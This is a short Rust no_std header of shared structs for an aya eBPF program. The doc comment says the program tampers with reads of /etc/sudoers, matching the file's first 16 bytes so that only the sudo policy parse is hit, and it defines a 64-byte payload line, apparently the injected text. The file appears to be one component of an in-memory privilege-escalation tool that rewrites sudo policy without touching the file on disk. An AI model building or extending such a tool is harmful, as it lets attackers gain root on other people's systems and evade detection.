#![no_std]

#[repr(C)]
#[derive(Clone, Copy)]
pub struct ReadCtx {
    pub buf: u64,
    pub count: u64,
}

#[repr(C)]
#[derive(Clone, Copy)]
pub struct Payload {
    pub line: [u8; 64],
    pub len: u32,
}

/// First bytes of /etc/sudoers, captured by the loader at startup. The probe
/// only tampers a read whose buffer begins with this signature — i.e. a read of
/// the file's *header* (offset 0). That targets the policy parse precisely and,
/// because library/ELF reads never match it, can't corrupt the loader's own
/// shared-library reads.
pub const SIG_LEN: usize = 16;

#[repr(C)]
#[derive(Clone, Copy)]
pub struct Sig {
    pub bytes: [u8; SIG_LEN],
}

#[cfg(feature = "user")]
unsafe impl aya::Pod for ReadCtx {}
#[cfg(feature = "user")]
unsafe impl aya::Pod for Payload {}
#[cfg(feature = "user")]
unsafe impl aya::Pod for Sig {}
